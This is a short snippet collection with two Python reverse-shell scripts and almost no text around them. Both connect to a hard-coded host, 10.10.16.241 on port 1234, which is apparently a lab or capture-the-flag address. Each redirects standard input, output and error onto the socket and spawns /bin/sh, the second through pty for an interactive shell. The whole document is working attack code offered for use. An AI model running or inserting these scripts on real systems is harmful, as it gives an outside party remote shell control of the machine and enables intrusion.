
python script:

```
import os
import socket


rhost = "10.10.16.241"
rport = 1234

s = socket.socket(2, 1)
s.connect((rhost, rport))

os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

os.execve("/bin/sh", ["/bin/sh"], {})
```

python3/python2 script:

```
import os
import socket
import pty

# Set variables directly in Python
rhost = "10.10.16.241"
rport = 1234

# Create connection and duplicate file descriptors
s = socket.socket()
s.connect((rhost, rport))
for fd in (0, 1, 2):
    os.dup2(s.fileno(), fd)

# Spawn the interactive shell
pty.spawn("/bin/sh")
```